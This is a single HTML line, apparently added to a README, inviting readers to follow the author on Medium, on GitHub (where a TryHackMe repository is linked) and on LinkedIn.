+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
